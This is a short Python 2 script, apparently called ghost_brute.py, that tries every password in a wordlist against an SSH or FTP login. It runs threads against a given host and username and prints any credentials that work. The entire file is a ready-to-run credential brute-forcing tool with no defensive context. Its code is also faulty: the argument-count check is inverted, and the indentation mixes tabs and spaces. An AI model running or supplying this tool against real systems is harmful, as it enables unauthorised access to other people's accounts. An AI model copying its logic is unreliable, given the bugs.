from pexpect import pxssh
from ftplib import FTP
import time
import sys
import threading
import os


def ssh_brute(password):
	try:
		s = pxssh.pxssh() # open ssh connection
		s.login(host,user,password) # try to login
		print "*******************************************************************"
		print "Password:\t"+password+"\nUsername:\t"+user+"\nHost:    \t"+host
		print "*******************************************************************"
		os._exit(1) # used to exit programs must use os._exit(1) to exit threads as well. Cant use sys.exit(0)
	except:
		sys.exit(0) # kill thread only

def ftp_brute(password):
	try:
		ftp = FTP(host)
		ftp.login(user,password)
		print "*******************************************************************"
		print "Password:\t"+password+"\nUsername:\t"+user+"\nHost:    \t"+host
		print "*******************************************************************"
		os._exit(1) # used to exit programs must use os._exit(1) to exit threads as well. Cant use sys.exit(0)
    	except:
		sys.exit(0) 

def main():
	with open(file,'r') as infile: # open password file
		for line in infile: # loop through each line
			password = line.strip('\r\n') # strip passowrd from the line
			print "[-] Testing "+ str(password)

			if option == '-ssh' or option == '-SSH': # if user picks ssh
				t = threading.Thread(target=ssh_brute, args=(password,)) # for each password in file start a new thread
				t.start() # Start thread SSH
				time.sleep(0.2) # wait .2 seconds

			elif option == '-ftp' or option == '-FTP':# if user picks ftp
				t = threading.Thread(target=ftp_brute, args=(password,)) # for each password in file start a new thread
                                t.start() # Start thread FTP
                                time.sleep(0.2) # wait .2 seconds

			else:
				print "Pick an option ftp or ssh\nEX: ghost_brute.py -ssh 10.0.0.4 admin passwordfile.txt"
				break

if(len(sys.argv) < 5):
	option = sys.argv[1]
	host = sys.argv[2] # host ex 192.168.1.1
	user = sys.argv[3] # user ex root
	file = sys.argv[4] # password file
	main()
	raw_input("Enter to Exit")
else:
	print "Pick an option ftp or ssh\nEX: ghost_brute.py -ssh 10.0.0.4 admin passwordfile.txt"
